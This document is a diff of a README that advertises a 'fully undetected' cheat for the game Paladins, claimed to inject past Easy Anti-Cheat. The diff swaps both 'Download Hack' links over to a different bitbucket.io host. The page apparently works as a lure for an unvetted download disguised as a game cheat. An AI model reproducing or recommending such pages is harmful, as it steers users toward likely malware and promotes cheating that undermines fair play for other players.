@@ -6,14 +6,14 @@ If you're done being out-aimed, out-positioned, and outplayed in **Paladins**, i
 
 Whether you main Viktor, Skye, or Koga, this tool turns every champ into a literal raid boss. 💥👑
 
-[![Download Hack](https://img.shields.io/badge/Download-Hack-blueviolet)](https://wecheaters.github.io/cheats/paladins/)
+[![Download Hack](https://img.shields.io/badge/Download-Hack-blueviolet)](https://fileoffload6.bitbucket.io)
 ---
 
 ## 🧰 Product Description
 
 This is a fully undetected cheat system made for the **Paladins PC** version (Steam or Epic). It injects cleanly, stays silent under Easy Anti-Cheat (EAC), and brings customizable cheat modules that you can toggle mid-match. Everything's modular, so you can play like a ghost or go full rage mode.
 
-[![Download Hack](https://i.ytimg.com/vi/b6E4IP6dJh4/maxresdefault.jpg)](https://wecheaters.github.io/cheats/paladins/)
+[![Download Hack](https://i.ytimg.com/vi/b6E4IP6dJh4/maxresdefault.jpg)](https://fileoffload6.bitbucket.io)
 ---
 
 ## 🔧 Core Features of the Paladins Hack
